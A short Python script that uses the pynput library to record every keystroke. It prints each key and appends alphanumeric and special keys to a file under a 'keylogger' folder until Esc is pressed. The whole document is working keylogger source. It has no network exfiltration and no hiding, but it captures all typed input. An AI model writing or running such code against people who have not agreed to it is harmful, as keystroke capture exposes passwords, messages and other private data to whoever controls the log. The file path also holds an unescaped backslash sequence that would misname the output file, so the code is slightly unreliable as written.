import pynput
from pynput.keyboard import Key, Listener
keys = []
def on_press(key):
    try:
        if key.char is not None and key.char.isalnum():
            print(f"Alphanumeric key '{key.char}' pressed")
            keys.append(key.char)
    except AttributeError:
        print(f"Special key '{key}' pressed")
        keys.append(str(key))

    write_file(keys)

def write_file(keys):
    with open('keylogger\record.txt', 'a') as f:
        if keys:  # Check if there are keys to write
            f.write(' '.join(keys) + '\n')  # Append a newline after each key press
        keys.clear()  # Clear the keys list after writing

def on_release(key):
    print(f"{key}")
    if key == Key.esc:  # Exit the listener when the 'Esc' key is pressed
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
